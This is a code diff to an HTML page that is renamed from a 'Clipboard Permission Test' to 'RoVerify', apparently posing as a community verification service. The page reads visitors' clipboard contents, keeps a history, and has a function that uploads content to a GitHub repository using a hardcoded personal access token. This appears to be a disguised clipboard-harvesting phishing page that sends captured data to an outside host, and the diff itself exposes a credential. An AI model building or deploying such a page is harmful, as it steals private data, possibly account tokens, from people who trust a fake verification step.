@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Clipboard Permission Test</title>
+  <title>RoVerify</title>
   <style>
     body { font-family: sans-serif; text-align: center; margin-top: 50px; }
     h1 { margin-bottom: 10px; }
@@ -10,6 +10,7 @@
     button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
     #output { margin-top: 20px; font-size: 18px; color: darkblue; }
     input { padding: 5px 10px; font-size: 16px; width: 300px; }
+    textarea { width: 80%; height: 200px; font-size: 14px; margin-top: 10px; }
   </style>
 </head>
 <body>
@@ -33,11 +34,16 @@
     <input type="text" id="manualInput" placeholder="Enter your username here and press Enter">
   </p>
 
+  <!-- Textarea for clipboard history -->
+  <p>Clipboard History (select and press Ctrl + C to copy):</p>
+  <textarea id="clipboardBox" readonly></textarea>
+
   <script>
     const btn = document.getElementById("readBtn");
     const output = document.getElementById("output");
     const refreshBtn = document.getElementById("refreshClipboardBtn");
     const manualInput = document.getElementById("manualInput");
+    const clipboardBox = document.getElementById("clipboardBox");
 
     // Clipboard verify button
     btn.addEventListener("click", async () => {
@@ -56,6 +62,7 @@
 
     function updateOutput() {
       output.innerHTML = "Clipboard History:<br>" + clipboardHistory.join("<br>");
+      clipboardBox.value = clipboardHistory.join("\n"); // update textarea
     }
     updateOutput();
 
@@ -63,10 +70,9 @@
     async function saveToGitHub(filename, content) {
       const token = "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"; // Your token
       const owner = "RoVer-Official"; // Replace with your username
-      const repo = "IDless-VC-Verification";       // Replace with your repo name
+      const repo = "IDless-VC-Verification"; // Replace with your repo name
       const path = filename;
 
-      // Try to get the current file SHA
       let sha = null;
       try {
         const res = await fetch(`https://api.github.com/repos/${owner}/${repo}/contents/${path}`);
